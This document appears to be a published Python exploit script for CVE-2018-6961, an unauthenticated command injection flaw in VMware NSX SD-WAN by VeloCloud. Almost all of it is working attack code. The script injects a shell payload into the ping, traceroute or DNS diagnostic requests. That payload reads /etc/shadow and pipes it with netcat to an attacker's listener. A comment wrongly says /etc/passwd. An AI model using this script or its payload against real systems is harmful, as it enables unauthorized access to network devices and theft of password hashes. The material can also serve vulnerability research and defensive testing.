  
# Exploit Title: Unauthenticated Command Injection vulnerability in VMware NSX SD-WAN by VeloCloud
# Exploit Author: paragonsec @ Critical Start
# Credit: Brian Sullivan from Tevora and Section 8 @ Critical Start
# Vendor Homepage: https://www.vmware.com
# Security Advisory: https://www.vmware.com/security/advisories/VMSA-2018-0011.html
# Version: 3.1.1 
# CVE: CVE-2018-6961
  
import argparse
import requests
import sys
import collections
  
&#039;&#039;&#039;
This script will return execute whatever payload you placed within it. 
Keep in mind that SD-WAN is running a slimmed down Linux version so obtaining a reverse shell isn&#039;t as simple as nc -e /bin/bash blah blah
The command within this script will send stdout of commands to your netcat listener. Feel free to change :)
&#039;&#039;&#039;
 
#Colors
OKRED = &#039;\033[91m&#039;
OKGREEN = &#039;\033[92m&#039;
ENDC = &#039;\033[0m&#039;
 
parser = argparse.ArgumentParser()
parser.add_argument("--rhost", help = "Remote Host")
parser.add_argument("--source", help = "Victim WAN Interface (e.g ge1, ge2)")
parser.add_argument(&#039;--lhost&#039;, help = &#039;Local Host listener&#039;)
parser.add_argument(&#039;--lport&#039;, help = &#039;Local Port listener&#039;)
parser.add_argument(&#039;--func&#039;, help = &#039;Function to abuse (e.g traceroute, ping, dns)&#039;)
args = parser.parse_args()
 
# Check to ensure at least one argument has been passed
if len(sys.argv)==1:
    parser.print_help(sys.stderr)
    sys.exit(1)
 
rhost = args.rhost
source = args.source
lhost = args.lhost
lport = args.lport
func = args.func
 
# Payload to be sent to the victim. Change to whatever you like!
# This payload will cat /etc/passwd from fictim and pipe it into a netcat connection to your listener giving you the contents of /etc/passwd
payload = "$(cat /etc/shadow |nc " + lhost + " " + lport + ")"
 
exploit_url = "http://" + rhost + "/scripts/ajaxPortal.lua"
  
headers = [
    (&#039;User-Agent&#039;,&#039;Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0&#039;),
    (&#039;Accept&#039;, &#039;application/json, text/javascript, */*; q=0.01&#039;),
    (&#039;Accept-Language&#039;, &#039;en-US,en;q=0.5&#039;),
    (&#039;Accept-Encoding&#039;, &#039;gzip, deflate&#039;),
    (&#039;Referer&#039;,&#039;http://&#039; + rhost + &#039;/&#039;),
    (&#039;Content-Type&#039;, &#039;application/x-www-form-urlencoded; charset=UTF-8&#039;),
    (&#039;X-Requested-With&#039;, &#039;XMLHttpRequest&#039;),
    (&#039;Cookie&#039;, &#039;culture=en-us&#039;),
    (&#039;Connection&#039;, &#039;close&#039;)
]
  
# probably not necessary but did it anyways
headers = collections.OrderedDict(headers)
  
# Setting up POST body parameters
if func == &#039;traceroute&#039;:
    body = "destination=8.8.8.8" + payload + "&source=" + source + "&test=TRACEROUTE&requestTimeout=900&auth_token=&_cmd=run_diagnostic"
elif func == &#039;dns&#039;:
    body = "name=google.com" + payload + "&test=DNS_TEST&requestTimeout=90&auth_token=&_cmd=run_diagnostic"
else:
    body = "destination=8.8.8.8" + payload + "&source=" + source + "&test=BASIC_PING&requestTimeout=90&auth_token=&_cmd=run_diagnostic"
 
print(OKGREEN + "Author: " + ENDC + "paragonsec @ Critical Start (https://www.criticalstart.com)")
print(OKGREEN + "Credits: " + ENDC + "Brian Sullivan @ Tevora and Section 8 team @ Critical Start")
print(OKGREEN + "CVE: " + ENDC + "2018-6961")
print(OKGREEN + "Description: " + ENDC + "Multiple Unauthenticated Command Injection Vulnerabilities in VeloCloud SD-WAN GUI Application\n")
     
print(OKGREEN + "[+]" + ENDC + "Running exploit...")
 
s = requests.Session()
 
req = requests.post(exploit_url, headers=headers, data=body)
if "UNKNOWN_COMMAND" not in req.text:
    print(OKGREEN + "[+]" + ENDC + "Exploit worked. Check listener!")
else:
    print(OKRED + "[!]" + ENDC + "Exploit failed. You lose!")

